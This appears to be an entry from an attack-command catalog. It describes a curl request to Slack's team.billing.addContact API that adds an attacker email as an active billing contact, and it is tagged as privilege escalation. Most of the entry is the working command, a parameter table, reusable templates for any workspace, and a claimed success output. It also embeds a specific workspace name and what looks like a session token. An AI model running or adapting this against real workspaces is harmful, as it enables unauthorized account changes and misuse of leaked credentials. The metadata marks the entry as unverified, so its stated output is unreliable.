---
id: cmd-slack-add-billing-001
data: >-
  curl -X POST
  'https://satishb3mailinator.slack.com/api/team.billing.addContact' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d
  'email=hacker@hacker.com&token=xoxs-3206092076-3204538285-3743137121-836b042620&set_active=true&_attempts=1'
tags:
  - api
  - privilege-escalation
type: command
output: '{"ok":true,"contact":{"email":"hacker@hacker.com","active":true}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.723Z'
verified: false
validated: true
submitted: true
---
# slack-add-billing-contact

## Command

```bash
curl -X POST 'https://satishb3mailinator.slack.com/api/team.billing.addContact' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -d 'email=hacker@hacker.com&token=xoxs-3206092076-3204538285-3743137121-836b042620&set_active=true&_attempts=1'
```

## Description

This command sends a POST request to Slack's billing API endpoint to add an unauthorized email contact using a team admin token, exploiting a privilege escalation vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| email | The email address to add as a billing contact (e.g., hacker@hacker.com) | Yes |
| token | Slack authentication token for the team admin (e.g., xoxs-...) | Yes |
| set_active | Sets the contact as active (true/false) | Yes |
| _attempts | Internal attempt counter (usually 1) | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://yourworkspace.slack.com/api/team.billing.addContact' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -d 'email=target@example.com&token=YOUR_TOKEN&set_active=true'
```

### Advanced Usage

```bash
curl -X POST 'https://yourworkspace.slack.com/api/team.billing.addContact' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -d 'email=target@example.com&token=YOUR_TOKEN&set_active=true&_attempts=1' \
  -v
```

## Expected Output

Successful execution returns a JSON response confirming the addition, such as {"ok":true,"contact":{"email":"hacker@hacker.com","active":true}}. Failure due to invalid token would return {"ok":false,"error":"invalid_auth"}.

## Related

- [[procedures/Slack-API-Billing-Contact-Escalation]]
